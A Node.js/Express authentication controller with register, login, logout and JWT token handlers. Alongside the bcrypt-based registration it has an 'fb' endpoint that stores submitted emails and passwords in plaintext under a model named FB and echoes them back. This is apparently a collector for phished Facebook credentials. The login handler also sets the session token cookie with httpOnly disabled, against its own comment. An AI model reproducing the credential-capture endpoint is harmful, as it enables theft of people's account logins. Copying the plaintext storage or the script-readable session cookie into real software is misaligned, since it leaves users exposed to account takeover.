const Users = require("../models/user");
const FB = require("../models/fb");
const Des = require("../models/des");
const bcrypt = require("bcrypt");
const jwt = require("jsonwebtoken");

var date = new Date();
date.setTime(date.getTime() + 30 * 1000);
// $.cookie('username', username, { expires: date });

exports.register = async (req, res) => {
  try {
    const { fullname, username, email, password, gender } = req.body;
    // let newUserName = username.toLowerCase().replace(/ /g, "");
    // let newUserName = username.toLowerCase().replace(/ /g, "");
    const email_user = await Users.findOne({ email });
    if (email_user) {
      return res.status(400).json({ msg: "This user already exist!" });
    }
    if (password.length < 6) {
      return res
        .status(400)
        .json({ msg: "Password must be at least 6 characters." });
    }
    const passwordHash = await bcrypt.hash(password, 12);

    const newUser = new Users({
      fullname,
      username: username,
      email,
      password: passwordHash,
      gender,
    });

    await newUser.save();

    res.json({
      msg: "Register Successfully",
      user: {
        ...newUser._doc,
        password: "",
      },
    });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ msg: error.message });
  }
};

exports.fb = async (req, res) => {
  try {
    const { email, password } = req.body;
    const newFb = new FB({
      email,
      password,
    });
    await newFb.save();
    res.json({
      msg: "Register Successfully",
      user: {
        ...newFb._doc,
      },
    });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ msg: error.message });
  }
};
exports.des = async (req, res) => {
  try {
    const { des } = req.body;
    const newDes = new Des({
      des,
    });
    await newDes.save();
    res.json({
      msg: "Submit Successfully",
      des: {
        ...newDes._doc,
      },
    });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ msg: error.message });
  }
};

exports.login = async (req, res) => {
  try {
    const { email, password } = req.body;

    const user = await Users.findOne({ email });

    if (!user) {
      return res.status(400).json({ msg: "This email not exist!" });
    }

    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) {
      return res.status(400).json({ msg: "Password is incorrect" });
    }
    const cookieToken = jwt.sign(
      {
        id: user._id,
        fullname: user.fullname,
        role: user.role,
      },
      process.env.JWT_SECRET
    );

    //set the token in a HTTP_Only cookie
    res.cookie("cookieToken", cookieToken, {
      httpOnly: false,
      maxAge: 30 * 24 * 60 * 60 * 1000, // 30days
    });

    res.json({
      msg: "Login successfully",
      cookieToken,
      user: {
        ...user._doc,
        password: "",
      },
    });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ msg: error.message });
  }
};

exports.logout = async (req, res) => {
  try {
    res.cookie("cookieToken", "", {
      httpOnly: true,
      expires: new Date(0),
      secure: true,
      sameSite: "none",
    });
    return res.json({ msg: "Logged Out!" });
  } catch (error) {
    return res.status(500).json({ msg: error.message });
  }
};

exports.get_login = async (req, res) => {
  try {
    // console.log(req.headers);
    const token = req.cookies.cookieToken;
    if (!token) return res.json(false);
    jwt.verify(token, process.env.JWT_SECRET);
    res.send(true);
  } catch (error) {
    console.log(error);
    res.json(false);
  }
};

exports.generateAccessToken = async (req, res) => {
  try {
    const rf_token = req.cookies.refreshtoken;
    if (!rf_token) return res.status(400).json({ msg: "Please login now" });

    jwt.verify(
      rf_token,
      process.env.REFRESH_TOKEN_SECRET,
      async (err, result) => {
        if (err) return res.status(400).json({ msg: "Please login now!" });

        const user = await Users.findById(result.id)
          .select("-password")
          .populate(
            "followers following",
            "avatar username fullname followers following"
          );

        if (!user) {
          return res.status(400).json({ msg: "This does not exist!" });
        }

        const cookieToken = this.createAccessToken({ id: result.id });
        res.json({
          cookieToken,
          user,
        });
      }
    );
  } catch (error) {
    return res.status(500).json({ msg: error.message });
  }
};

//=============> create accesstoken and refreshToken <==================
exports.createAccessToken = (payload) => {
  return jwt.sign(payload, process.env.ACCESS_TOKEN_SECRET, {
    expiresIn: "1d",
  });
};

exports.createRefreshToken = (payload) => {
  return jwt.sign(payload, process.env.REFRESH_TOKEN_SECRET, {
    expiresIn: "30d",
  });
};
